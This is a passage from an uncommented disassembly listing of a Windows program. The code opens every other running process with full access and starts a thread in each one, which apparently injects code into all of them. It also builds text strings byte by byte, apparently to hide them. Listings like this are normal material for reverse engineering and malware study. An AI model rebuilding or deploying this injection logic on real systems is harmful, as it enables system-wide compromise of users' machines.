		cmp	[ebp+var_5], 0
		jz	loc_40D5D4
		xor	eax, eax
		mov	[ebp+var_18], eax
		lea	edx, [ebp+var_28]
		mov	eax, offset dword_40D610
		call	sub_4064CC
		mov	eax, [ebp+var_28]
		call	sub_403E24
		push	eax		; lpName
		push	0Ch		; dwMaximumSizeLow
		push	0		; dwMaximumSizeHigh
		push	4		; flProtect
		push	0		; lpFileMappingAttributes
		push	0FFFFFFFFh	; hFile
		call	CreateFileMappingA
		mov	edi, eax
		test	edi, edi
		jz	loc_40D3D2
		call	GetLastError
		cmp	eax, 0B7h
		setnz	bl
		push	0		; dwNumberOfBytesToMap
		push	0		; dwFileOffsetLow
		push	0		; dwFileOffsetHigh
		push	0F001Fh		; dwDesiredAccess
		push	edi		; hFileMappingObject
		call	MapViewOfFile
		mov	esi, eax
		test	esi, esi
		jz	short loc_40D3CC
		mov	[ebp+nCount], 32h

loc_40D354:				; CODE XREF: sub_40D1F8+186j
		test	bl, bl
		jnz	short loc_40D380
		mov	eax, [esi]
		mov	edx, [esi+4]
		push	edx
		push	eax
		mov	eax, [ebp+var_28]
		mov	edx, [eax+4]
		mov	eax, [eax]
		cmp	edx, [esp+174h+var_170]
		jnz	short loc_40D370
		cmp	eax, [esp+0]

loc_40D370:				; CODE XREF: sub_40D1F8+173j
		pop	edx
		pop	eax
		jz	short loc_40D380
		push	32h		; dwMilliseconds
		call	Sleep
		dec	[ebp+nCount]
		jnz	short loc_40D354

loc_40D380:				; CODE XREF: sub_40D1F8+15Ej
					; sub_40D1F8+17Aj
		test	bl, bl
		jnz	short loc_40D395
		mov	eax, [esi]
		mov	edx, [esi+4]
		mov	ecx, [ebp+var_28]
		cmp	edx, [ecx+4]
		jnz	short loc_40D393
		cmp	eax, [ecx]

loc_40D393:				; CODE XREF: sub_40D1F8+197j
		jz	short loc_40D3C0

loc_40D395:				; CODE XREF: sub_40D1F8+18Aj
		push	0
		push	0
		mov	eax, offset sub_40CCE0
		xor	ecx, ecx
		xor	edx, edx
		call	sub_40AB44
		mov	[esi+8], eax
		mov	edx, esi
		mov	ecx, 8
		mov	eax, [ebp+var_28]
		call	sub_40C1B0
		mov	eax, edi
		call	sub_40A660

loc_40D3C0:				; CODE XREF: sub_40D1F8:loc_40D393j
		mov	eax, [esi+8]
		mov	[ebp+var_18], eax
		push	esi		; lpBaseAddress
		call	UnmapViewOfFile

loc_40D3CC:				; CODE XREF: sub_40D1F8+153j
		push	edi		; hObject
		call	CloseHandle

loc_40D3D2:				; CODE XREF: sub_40D1F8+12Bj
		cmp	[ebp+var_18], 0
		jz	loc_40D5D4
		call	sub_409DD4
		xor	eax, eax
		mov	[ebp+nCount], eax
		push	0
		push	2
		mov	eax, ds:off_416D50
		mov	eax, [eax]
		call	eax
		mov	[ebp+var_C], eax
		cmp	[ebp+var_C], 0FFFFFFFFh
		jz	loc_40D550
		xor	eax, eax
		push	ebp
		push	offset loc_40D549
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		cmp	[ebp+var_6], 0
		jz	short loc_40D41B
		xor	eax, eax
		mov	[ebp+var_24], eax
		jmp	short loc_40D422
; ---------------------------------------------------------------------------

loc_40D41B:				; CODE XREF: sub_40D1F8+21Aj
		mov	[ebp+var_24], 1F4h

loc_40D422:				; CODE XREF: sub_40D1F8+221j
		mov	[ebp+var_150], 128h
		lea	eax, [ebp+var_150]
		push	eax
		mov	eax, [ebp+var_C]
		push	eax
		mov	eax, ds:off_416E60
		mov	eax, [eax]
		call	eax
		test	eax, eax
		jz	loc_40D532

loc_40D448:				; CODE XREF: sub_40D1F8+334j
		call	GetCurrentProcessId
		cmp	eax, [ebp+dwProcessId]
		jz	loc_40D516
		mov	eax, [ebp+dwProcessId]
		push	eax		; dwProcessId
		push	0		; bInheritHandle
		push	1F0FFFh		; dwDesiredAccess
		call	OpenProcess
		mov	[ebp+var_10], eax
		cmp	[ebp+var_10], 0
		jz	loc_40D516
		xor	eax, eax
		push	ebp
		push	offset loc_40D50F
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		lea	eax, [ebp+hObject]
		push	eax
		push	0
		mov	eax, [ebp+var_24]
		push	eax
		mov	eax, [ebp+var_18]
		push	eax
		push	0
		push	0
		mov	eax, [ebp+var_10]
		push	eax
		call	sub_40B410
		mov	[ebp+hObject], eax
		cmp	[ebp+hObject], 0
		jz	short loc_40D4F8
		cmp	[ebp+var_6], 0
		jz	short loc_40D4DD
		mov	eax, [ebp+nCount]
		inc	eax
		push	eax
		lea	eax, [ebp+lpHandles]
		mov	ecx, 1
		mov	edx, off_405464
		call	sub_404718
		add	esp, 4
		mov	eax, [ebp+lpHandles]
		mov	edx, [ebp+nCount]
		mov	ecx, [ebp+hObject]
		mov	[eax+edx*4], ecx
		inc	[ebp+nCount]
		jmp	short loc_40D4F8
; ---------------------------------------------------------------------------

loc_40D4DD:				; CODE XREF: sub_40D1F8+2B7j
		push	0FFFFFFF1h	; nPriority
		mov	eax, [ebp+hObject]
		push	eax		; hThread
		call	SetThreadPriority
		mov	eax, [ebp+hObject]
		push	eax		; hObject
		call	CloseHandle
		add	[ebp+var_24], 1F4h

loc_40D4F8:				; CODE XREF: sub_40D1F8+2B1j
					; sub_40D1F8+2E3j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40D516

loc_40D505:				; CODE XREF: sub_40D1F8+31Cj
		mov	eax, [ebp+var_10]
		push	eax		; hObject
		call	CloseHandle
		retn
; ---------------------------------------------------------------------------

loc_40D50F:				; DATA XREF: sub_40D1F8+284o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40D505
; ---------------------------------------------------------------------------

loc_40D516:				; CODE XREF: sub_40D1F8+25Bj
					; sub_40D1F8+27Bj ...
		lea	eax, [ebp+var_150]
		push	eax
		mov	eax, [ebp+var_C]
		push	eax
		mov	eax, ds:off_416DEC
		mov	eax, [eax]
		call	eax
		test	eax, eax
		jnz	loc_40D448

loc_40D532:				; CODE XREF: sub_40D1F8+24Aj
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40D550

loc_40D53F:				; CODE XREF: sub_40D1F8+356j
		mov	eax, [ebp+var_C]
		push	eax		; hObject
		call	CloseHandle
		retn
; ---------------------------------------------------------------------------

loc_40D549:				; DATA XREF: sub_40D1F8+20Bo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40D53F
; ---------------------------------------------------------------------------

loc_40D550:				; CODE XREF: sub_40D1F8+202j
					; sub_40D1F8+350j
					; DATA XREF: ...
		cmp	[ebp+nCount], 0
		jle	short loc_40D5D4

loc_40D556:				; CODE XREF: sub_40D1F8+3DAj
		cmp	[ebp+nCount], 20h
		jle	short loc_40D5A0
		push	0FFFFFFFFh	; dwMilliseconds
		push	0FFFFFFFFh	; bWaitAll
		mov	eax, [ebp+lpHandles]
		push	eax		; lpHandles
		push	20h		; nCount
		call	WaitForMultipleObjects
		xor	ebx, ebx

loc_40D56D:				; CODE XREF: sub_40D1F8+385j
		mov	eax, [ebp+lpHandles]
		mov	eax, [eax+ebx*4]
		push	eax		; hObject
		call	CloseHandle
		inc	ebx
		cmp	ebx, 20h
		jnz	short loc_40D56D
		mov	eax, [ebp+nCount]
		sub	eax, 20h
		mov	ecx, eax
		shl	ecx, 2
		mov	edx, [ebp+lpHandles]
		mov	eax, [ebp+lpHandles]
		add	eax, 80h
		call	sub_402664
		sub	[ebp+nCount], 20h
		jmp	short loc_40D5CE
; ---------------------------------------------------------------------------

loc_40D5A0:				; CODE XREF: sub_40D1F8+362j
		push	0FFFFFFFFh	; dwMilliseconds
		push	0FFFFFFFFh	; bWaitAll
		mov	eax, [ebp+lpHandles]
		push	eax		; lpHandles
		mov	eax, [ebp+nCount]
		push	eax		; nCount
		call	WaitForMultipleObjects
		mov	esi, [ebp+nCount]
		dec	esi
		test	esi, esi
		jl	short loc_40D5D4
		inc	esi
		xor	ebx, ebx

loc_40D5BC:				; CODE XREF: sub_40D1F8+3D2j
		mov	eax, [ebp+lpHandles]
		mov	eax, [eax+ebx*4]
		push	eax		; hObject
		call	CloseHandle
		inc	ebx
		dec	esi
		jnz	short loc_40D5BC
		jmp	short loc_40D5D4
; ---------------------------------------------------------------------------

loc_40D5CE:				; CODE XREF: sub_40D1F8+3A6j
		cmp	[ebp+nCount], 0
		jg	short loc_40D556

loc_40D5D4:				; CODE XREF: sub_40D1F8+F7j
					; sub_40D1F8+1DEj ...
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40D5FF

loc_40D5E1:				; CODE XREF: sub_40D1F8+405j
		lea	eax, [ebp+var_28]
		call	sub_403994
		lea	eax, [ebp+lpHandles]
		mov	edx, off_405464
		call	sub_404724
		retn
; ---------------------------------------------------------------------------

loc_40D5F8:				; DATA XREF: sub_40D1F8+17o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40D5E1
; ---------------------------------------------------------------------------

loc_40D5FF:				; CODE XREF: sub_40D1F8+3FFj
					; DATA XREF: sub_40D1F8+3E4o
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_40D1F8	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 8
dword_40D610	dd 53D3638h, 107213Ch, 0 ; DATA	XREF: sub_40D1F8+105o

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40D61C	proc near		; DATA XREF: sub_40DEDC+18Do

var_17E		= byte ptr -17Eh
var_17D		= byte ptr -17Dh
var_17C		= byte ptr -17Ch
var_17B		= byte ptr -17Bh
var_17A		= byte ptr -17Ah
var_179		= byte ptr -179h
var_178		= byte ptr -178h
var_177		= byte ptr -177h
var_176		= byte ptr -176h
var_175		= byte ptr -175h
var_174		= byte ptr -174h
var_173		= byte ptr -173h
var_172		= byte ptr -172h
var_171		= byte ptr -171h
var_170		= byte ptr -170h
var_16F		= byte ptr -16Fh
var_16E		= byte ptr -16Eh
var_16D		= byte ptr -16Dh
var_16C		= byte ptr -16Ch
var_16B		= byte ptr -16Bh
var_16A		= byte ptr -16Ah
var_169		= byte ptr -169h
var_168		= byte ptr -168h
var_167		= byte ptr -167h
var_166		= byte ptr -166h
var_165		= byte ptr -165h
var_15D		= byte ptr -15Dh
var_15C		= byte ptr -15Ch
var_15B		= byte ptr -15Bh
var_15A		= byte ptr -15Ah
var_159		= byte ptr -159h
var_158		= byte ptr -158h
var_157		= byte ptr -157h
var_156		= byte ptr -156h
var_155		= byte ptr -155h
var_154		= byte ptr -154h
var_153		= byte ptr -153h
var_152		= byte ptr -152h
var_151		= byte ptr -151h
var_150		= byte ptr -150h
var_14F		= byte ptr -14Fh
var_14E		= byte ptr -14Eh
var_14D		= byte ptr -14Dh
var_14C		= byte ptr -14Ch
var_14B		= byte ptr -14Bh
var_14A		= byte ptr -14Ah
var_149		= byte ptr -149h
var_148		= byte ptr -148h
var_147		= byte ptr -147h
var_146		= byte ptr -146h
var_145		= byte ptr -145h
var_144		= byte ptr -144h
var_143		= byte ptr -143h
var_142		= byte ptr -142h
var_141		= byte ptr -141h
var_140		= byte ptr -140h
var_13F		= byte ptr -13Fh
var_13E		= byte ptr -13Eh
var_13D		= byte ptr -13Dh
var_135		= byte ptr -135h
var_134		= dword	ptr -134h
var_34		= dword	ptr -34h
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1A		= byte ptr -1Ah
var_19		= byte ptr -19h
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFE80h
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_15C], 4Eh
		mov	[ebp+var_15B], 61h
		mov	[ebp+var_15A], 6Dh
		mov	[ebp+var_159], 65h
		mov	[ebp+var_158], 64h
		mov	[ebp+var_157], 42h
		mov	[ebp+var_156], 75h
		mov	[ebp+var_17E], 4Dh
		mov	[ebp+var_155], 66h
		mov	[ebp+var_17D], 75h
		mov	[ebp+var_154], 66h
		mov	[ebp+var_17C], 74h
		mov	[ebp+var_153], 65h
		mov	[ebp+var_17B], 65h
		mov	[ebp+var_152], 72h
		mov	[ebp+var_17A], 78h
		mov	[ebp+var_151], 2Ch
		mov	[ebp+var_179], 2Ch
		mov	[ebp+var_150], 20h
		mov	[ebp+var_178], 20h
		mov	[ebp+var_14F], 6Dh
		mov	[ebp+var_177], 6Dh
		mov	[ebp+var_14E], 41h
		mov	[ebp+var_176], 41h
		mov	[ebp+var_14D], 48h
		mov	[ebp+var_175], 48h
		mov	[ebp+var_14C], 2Ch
		mov	[ebp+var_174], 2Ch
		mov	[ebp+var_14B], 20h
		mov	[ebp+var_173], 20h
		mov	[ebp+var_14A], 53h
		mov	[ebp+var_172], 53h
		mov	[ebp+var_149], 68h
		mov	[ebp+var_171], 68h
		mov	[ebp+var_148], 61h
		mov	[ebp+var_170], 61h
		mov	[ebp+var_147], 72h
		mov	[ebp+var_16F], 72h
		mov	[ebp+var_146], 65h
		mov	[ebp+var_16E], 65h
		mov	[ebp+var_145], 64h
		mov	[ebp+var_16D], 64h
		mov	[ebp+var_144], 2Ch
		mov	[ebp+var_16C], 2Ch
		mov	[ebp+var_143], 20h
		mov	[ebp+var_16B], 20h
		mov	[ebp+var_142], 41h
		mov	[ebp+var_16A], 41h
		mov	[ebp+var_141], 50h
		mov	[ebp+var_169], 50h
		mov	[ebp+var_140], 49h
		mov	[ebp+var_168], 49h
		mov	[ebp+var_13F], 20h
		mov	[ebp+var_167], 20h
		mov	[ebp+var_13E], 24h
		mov	[ebp+var_166], 24h
		mov	[ebp+var_135], 0
		mov	[ebp+var_15D], 0
		xor	eax, eax
		mov	[ebp+var_8], eax
		cmp	[ebp+var_8], 40h
		jnb	loc_40DC1A

loc_40D7CD:				; CODE XREF: sub_40D61C+5F8j
		cmp	[ebp+var_8], 0
		jnz	short loc_40D811
		push	0FFFFFFFFh
		mov	eax, [ebp+arg_0]
		mov	eax, [eax]
		push	eax
		call	ds:dword_416A18
		mov	eax, [ebp+arg_0]
		lea	esi, [eax+0Ch]
		lea	edi, [ebp+var_134]
		mov	ecx, 40h
		rep movsd
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+208h]
		mov	[ebp+var_8], eax
		mov	eax, [ebp+arg_0]
		mov	eax, [eax]
		push	eax
		call	ds:dword_416A34
		jmp	loc_40DBF7
; ---------------------------------------------------------------------------

loc_40D811:				; CODE XREF: sub_40D61C+1B5j
		push	0FFFFFFFFh
		mov	eax, [ebp+arg_0]
		mov	eax, [eax]
		push	eax
		call	ds:dword_416A18
		mov	eax, [ebp+arg_0]
		mov	edx, [ebp+var_8]
		mov	eax, [eax+edx*4+108h]
		mov	[ebp+var_C], eax
		mov	eax, [ebp+arg_0]
		mov	edx, [ebp+var_8]
		mov	ebx, [eax+edx*4+0Ch]
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+208h]
		mov	edx, [ebp+arg_0]
		mov	eax, [edx+eax*4+108h]
		mov	edx, [ebp+arg_0]
		mov	ecx, [ebp+var_8]
		mov	[edx+ecx*4+108h], eax
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+208h]
		mov	edx, [ebp+arg_0]
		xor	ecx, ecx
		mov	[edx+eax*4+108h], ecx
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+208h]
		mov	edx, [ebp+arg_0]
		mov	eax, [edx+eax*4+0Ch]
		mov	edx, [ebp+arg_0]
		mov	ecx, [ebp+var_8]
		mov	[edx+ecx*4+0Ch], eax
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+208h]
		mov	edx, [ebp+arg_0]
		xor	ecx, ecx
		mov	[edx+eax*4+0Ch], ecx
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+208h]
		mov	edx, [ebp+eax*4+var_134]
		mov	ecx, [ebp+var_8]
		mov	[ebp+ecx*4+var_134], edx
		mov	edx, [ebp+arg_0]
		xor	edx, edx
		mov	[ebp+eax*4+var_134], edx
		mov	eax, [ebp+arg_0]
		dec	dword ptr [eax+208h]
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+208h]
		mov	[ebp+var_8], eax
		mov	eax, [ebp+arg_0]
		mov	eax, [eax]
		push	eax
		call	ds:dword_416A34
		push	ebx
		call	ds:dword_416A30
		push	0FFFFFFFFh
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+4]
		push	eax
		call	ds:dword_416A18
		xor	eax, eax
		mov	[ebp+var_14], eax
		mov	esi, [ebp+arg_0]
		mov	esi, [esi+8]
		mov	eax, [esi]
		dec	eax
		test	eax, eax
		jl	short loc_40D948
		inc	eax
		mov	[ebp+var_2C], eax
		mov	[ebp+var_10], 0

loc_40D914:				; CODE XREF: sub_40D61C+32Aj
		mov	eax, [ebp+var_10]
		lea	eax, [eax+eax*2]
		mov	edx, [esi+4]
		lea	edx, [edx+eax*8]
		mov	eax, [edx+10h]
		dec	eax
		test	eax, eax
		jl	short loc_40D940
		inc	eax
		xor	ebx, ebx

loc_40D92B:				; CODE XREF: sub_40D61C+322j
		lea	ecx, [ebx+ebx*2]
		mov	edi, [edx+14h]
		mov	ecx, [edi+ecx*4]
		cmp	ecx, [ebp+var_C]
		jnz	short loc_40D93C
		inc	[ebp+var_14]

loc_40D93C:				; CODE XREF: sub_40D61C+31Bj
		inc	ebx
		dec	eax
		jnz	short loc_40D92B

loc_40D940:				; CODE XREF: sub_40D61C+30Aj
		inc	[ebp+var_10]
		dec	[ebp+var_2C]
		jnz	short loc_40D914

loc_40D948:				; CODE XREF: sub_40D61C+2EBj
		mov	eax, [ebp+var_14]
		shl	eax, 3
		lea	eax, [eax+eax*2]
		push	eax
		push	40h
		call	ds:dword_416A3C
		mov	[ebp+var_18], eax
		xor	eax, eax
		mov	[ebp+var_14], eax
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+8]
		mov	[ebp+var_30], eax
		mov	[ebp+var_19], 1
		mov	eax, [ebp+var_30]
		mov	eax, [eax]
		dec	eax
		test	eax, eax
		jl	loc_40DA4D
		inc	eax
		mov	[ebp+var_2C], eax
		mov	[ebp+var_10], 0

loc_40D988:				; CODE XREF: sub_40D61C+42Bj
		mov	eax, [ebp+var_10]
		lea	eax, [eax+eax*2]
		mov	edx, [ebp+var_30]
		mov	edx, [edx+4]
		lea	esi, [edx+eax*8]
		mov	[ebp+var_1A], 1
		mov	eax, [esi+10h]
		dec	eax
		test	eax, eax
		jl	short loc_40DA17
		inc	eax
		xor	ebx, ebx

loc_40D9A6:				; CODE XREF: sub_40D61C+3F9j
		lea	edx, [ebx+ebx*2]
		mov	ecx, [esi+14h]
		mov	edx, [ecx+edx*4]
		cmp	edx, [ebp+var_C]
		jnz	short loc_40DA03
		mov	edx, [ebp+var_10]
		lea	edx, [edx+edx*2]
		mov	ecx, [ebp+var_30]
		mov	ecx, [ecx+4]
		lea	edx, [ecx+edx*8]
		push	edx
		mov	edx, [ebp+var_14]
		lea	edx, [edx+edx*2]
		mov	ecx, [ebp+var_18]
		pop	edi
		push	esi
		mov	esi, edi
		lea	edi, [ecx+edx*8]
		mov	ecx, 6
		rep movsd
		pop	esi
		lea	edx, [ebx+ebx*2]
		mov	ecx, [esi+14h]
		mov	edx, [ecx+edx*4+8]
		mov	ecx, [ebp+var_14]
		lea	ecx, [ecx+ecx*2]
		mov	edi, [ebp+var_18]
		mov	[edi+ecx*8+0Ch], edx
		inc	[ebp+var_14]
		lea	edx, [ebx+ebx*2]
		mov	ecx, [esi+14h]
		xor	edi, edi
		mov	[ecx+edx*4], edi
		jmp	short loc_40DA13
; ---------------------------------------------------------------------------

loc_40DA03:				; CODE XREF: sub_40D61C+396j
		lea	edx, [ebx+ebx*2]
		mov	ecx, [esi+14h]
		cmp	dword ptr [ecx+edx*4], 0
		jz	short loc_40DA13
		mov	[ebp+var_1A], 0

loc_40DA13:				; CODE XREF: sub_40D61C+3E5j
					; sub_40D61C+3F1j
		inc	ebx
		dec	eax
		jnz	short loc_40D9A6

loc_40DA17:				; CODE XREF: sub_40D61C+385j
		cmp	[ebp+var_1A], 0
		jz	short loc_40DA37
		mov	eax, [esi+14h]
		test	eax, eax
		jz	short loc_40DA2B
		push	eax
		call	ds:dword_416A54

loc_40DA2B:				; CODE XREF: sub_40D61C+406j
		xor	eax, eax
		mov	[esi+10h], eax
		xor	eax, eax
		mov	[esi+14h], eax
		jmp	short loc_40DA41
; ---------------------------------------------------------------------------

loc_40DA37:				; CODE XREF: sub_40D61C+3FFj
		cmp	dword ptr [esi+10h], 0
		jle	short loc_40DA41
		mov	[ebp+var_19], 0

loc_40DA41:				; CODE XREF: sub_40D61C+419j
					; sub_40D61C+41Fj
		inc	[ebp+var_10]
		dec	[ebp+var_2C]
		jnz	loc_40D988

loc_40DA4D:				; CODE XREF: sub_40D61C+35Bj
		cmp	[ebp+var_19], 0
		jz	short loc_40DA78
		mov	eax, [ebp+var_30]
		cmp	dword ptr [eax+4], 0
		jz	short loc_40DA69
		mov	eax, [ebp+var_30]
		mov	eax, [eax+4]
		push	eax
		call	ds:dword_416A54

loc_40DA69:				; CODE XREF: sub_40D61C+43Ej
		mov	eax, [ebp+var_30]
		xor	edx, edx
		mov	[eax], edx
		mov	eax, [ebp+var_30]
		xor	edx, edx
		mov	[eax+4], edx

loc_40DA78:				; CODE XREF: sub_40D61C+435j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+4]
		push	eax
		call	ds:dword_416A34
		mov	eax, [ebp+var_14]
		dec	eax
		test	eax, eax
		jl	loc_40DBED
		inc	eax
		mov	[ebp+var_2C], eax
		mov	[ebp+var_10], 0

loc_40DA9C:				; CODE XREF: sub_40D61C+5CBj
		mov	eax, [ebp+var_10]
		lea	eax, [eax+eax*2]
		mov	edx, [ebp+var_18]
		lea	esi, [edx+eax*8]
		lea	eax, [ebp+var_13D]
		mov	edx, [esi+4]
		mov	[eax], edx
		mov	edx, [esi+8]
		mov	[eax+4], edx
		lea	eax, [ebp+var_165]
		mov	edx, [esi+4]
		mov	[eax], edx
		mov	edx, [esi+8]
		mov	[eax+4], edx
		lea	eax, [ebp+var_17E]
		push	eax
		push	0
		push	0
		call	ds:dword_416A10
		mov	[ebp+var_20], eax
		cmp	[ebp+var_20], 0
		jz	loc_40DBE1
		push	0FFFFFFFFh
		mov	eax, [ebp+var_20]
		push	eax
		call	ds:dword_416A18
		lea	eax, [ebp+var_15C]
		push	eax
		push	0
		push	0F001Fh
		call	ds:dword_416A20
		mov	[ebp+var_24], eax
		cmp	[ebp+var_24], 0
		jz	loc_40DBCD
		push	0
		push	0
		push	0
		push	0F001Fh
		mov	eax, [ebp+var_24]
		push	eax
		call	ds:dword_416A24
		mov	[ebp+var_28], eax
		cmp	[ebp+var_28], 0
		jz	loc_40DBC3
		mov	eax, [ebp+var_28]
		mov	eax, [eax]
		mov	[ebp+var_34], eax
		mov	eax, [ebp+var_34]
		mov	eax, [eax]
		sub	eax, 2
		test	eax, eax
		jle	short loc_40DBB9
		mov	ebx, 1

loc_40DB50:				; CODE XREF: sub_40D61C+59Bj
		mov	edx, [ebp+var_34]
		mov	edx, [edx+ebx*8+1Ch]
		cmp	edx, [esi+0Ch]
		jnz	short loc_40DBB5
		mov	eax, [ebp+var_34]
		mov	eax, [eax]
		sub	eax, 2
		sub	eax, ebx
		jl	short loc_40DB90
		inc	eax
		mov	[ebp+var_14], ebx

loc_40DB6C:				; CODE XREF: sub_40D61C+572j
		mov	edx, [ebp+var_34]
		mov	ecx, [ebp+var_14]
		lea	edx, [edx+ecx*8+1Ch]
		mov	ecx, [ebp+var_34]
		mov	edi, [ebp+var_14]
		lea	edi, [ecx+edi*8+24h]
		mov	ecx, [edi]
		mov	[edx], ecx
		mov	ecx, [edi+4]
		mov	[edx+4], ecx
		inc	[ebp+var_14]
		dec	eax
		jnz	short loc_40DB6C

loc_40DB90:				; CODE XREF: sub_40D61C+54Aj
		mov	eax, [ebp+var_34]
		mov	eax, [eax+ebx*8+1Ch]
		mov	edx, [ebp+var_34]
		mov	edx, [edx+ebx*8+18h]
		mov	[edx], eax
		mov	eax, [ebp+var_34]
		dec	dword ptr [eax]
		mov	eax, [esi+0Ch]
		test	eax, eax
		jz	short loc_40DBB9
		push	eax
		call	ds:dword_416A54
		jmp	short loc_40DBB9
; ---------------------------------------------------------------------------

loc_40DBB5:				; CODE XREF: sub_40D61C+53Ej
		inc	ebx
		dec	eax
		jnz	short loc_40DB50

loc_40DBB9:				; CODE XREF: sub_40D61C+52Dj
					; sub_40D61C+58Ej ...
		mov	eax, [ebp+var_28]
		push	eax
		call	ds:dword_416A2C

loc_40DBC3:				; CODE XREF: sub_40D61C+515j
		mov	eax, [ebp+var_24]
		push	eax
		call	ds:dword_416A30

loc_40DBCD:				; CODE XREF: sub_40D61C+4F3j
		mov	eax, [ebp+var_20]
		push	eax
		call	ds:dword_416A34
		mov	eax, [ebp+var_20]
		push	eax
		call	ds:dword_416A30

loc_40DBE1:				; CODE XREF: sub_40D61C+4C6j
		inc	[ebp+var_10]
		dec	[ebp+var_2C]
		jnz	loc_40DA9C

loc_40DBED:				; CODE XREF: sub_40D61C+46Fj
		mov	eax, [ebp+var_18]
		push	eax
		call	ds:dword_416A40

loc_40DBF7:				; CODE XREF: sub_40D61C+1F0j
		push	0FFFFFFFFh
		push	0
		lea	eax, [ebp+var_134]
		push	eax
		mov	eax, [ebp+var_8]
		inc	eax
		push	eax
		call	ds:dword_416A4C
		mov	[ebp+var_8], eax
		cmp	[ebp+var_8], 40h
		jb	loc_40D7CD

loc_40DC1A:				; CODE XREF: sub_40D61C+1ABj
		xor	eax, eax
		mov	[ebp+var_4], eax
		mov	eax, [ebp+var_4]
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn	4
sub_40D61C	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40DC2C	proc near		; CODE XREF: sub_40DD40+60p
					; sub_40DDC8+36p

var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFF8h
		push	ebx
		push	esi
		push	edi
		lea	eax, [eax+eax*2]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-4]
		mov	edx, [edx+4]
		lea	ebx, [edx+eax*8]
		mov	edx, [ebx+10h]
		dec	edx
		test	edx, edx
		jl	short loc_40DC8A
		inc	edx
		xor	eax, eax

loc_40DC4F:				; CODE XREF: sub_40DC2C+5Cj
		lea	ecx, [eax+eax*2]
		mov	esi, [ebx+14h]
		cmp	dword ptr [esi+ecx*4], 0
		jnz	short loc_40DC86
		mov	edx, [ebx+14h]
		mov	esi, [ebp+arg_0]
		mov	esi, [esi-8]
		mov	[edx+ecx*4], esi
		mov	edx, [ebx+14h]
		mov	esi, [ebp+arg_0]
		mov	esi, [esi-0Ch]
		mov	[edx+ecx*4+4], esi
		mov	eax, [ebx+14h]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+8]
		mov	[eax+ecx*4+8], edx
		jmp	loc_40DD37
; ---------------------------------------------------------------------------

loc_40DC86:				; CODE XREF: sub_40DC2C+2Dj
		inc	eax
		dec	edx
		jnz	short loc_40DC4F

loc_40DC8A:				; CODE XREF: sub_40DC2C+1Ej
		mov	eax, [ebx+10h]
		mov	[ebp+var_4], eax
		test	eax, eax
		jnz	short loc_40DC9D
		mov	dword ptr [ebx+10h], 10h
		jmp	short loc_40DCA2
; ---------------------------------------------------------------------------

loc_40DC9D:				; CODE XREF: sub_40DC2C+66j
		add	eax, eax
		mov	[ebx+10h], eax

loc_40DCA2:				; CODE XREF: sub_40DC2C+6Fj
		push	0
		mov	eax, [ebx+10h]
		shl	eax, 2
		lea	eax, [eax+eax*2]
		push	eax
		call	sub_40A770
		mov	[ebp+var_8], eax
		mov	edx, [ebp+var_4]
		dec	edx
		test	edx, edx
		jl	short loc_40DCE7
		inc	edx
		xor	eax, eax

loc_40DCC1:				; CODE XREF: sub_40DC2C+B9j
		lea	ecx, [eax+eax*2]
		mov	esi, [ebp+var_8]
		lea	ecx, [esi+ecx*4]
		lea	esi, [eax+eax*2]
		mov	edi, [ebx+14h]
		lea	edi, [edi+esi*4]
		mov	esi, [edi]
		mov	[ecx], esi
		mov	esi, [edi+4]
		mov	[ecx+4], esi
		mov	esi, [edi+8]
		mov	[ecx+8], esi
		inc	eax
		dec	edx
		jnz	short loc_40DCC1

loc_40DCE7:				; CODE XREF: sub_40DC2C+90j
		push	0
		mov	eax, [ebx+14h]
		push	eax
		call	sub_40A890
		mov	eax, [ebp+var_8]
		mov	[ebx+14h], eax
		mov	edx, [ebp+var_4]
		lea	edx, [edx+edx*2]
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx-8]
		mov	[eax+edx*4], ecx
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx-0Ch]
		mov	[eax+edx*4+4], ecx
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+8]
		mov	[eax+edx*4+8], ecx
		mov	eax, [ebp+var_4]
		inc	eax
		mov	edx, [ebx+10h]
		dec	edx
		sub	edx, eax
		jl	short loc_40DD37
		inc	edx

loc_40DD28:				; CODE XREF: sub_40DC2C+109j
		lea	ecx, [eax+eax*2]
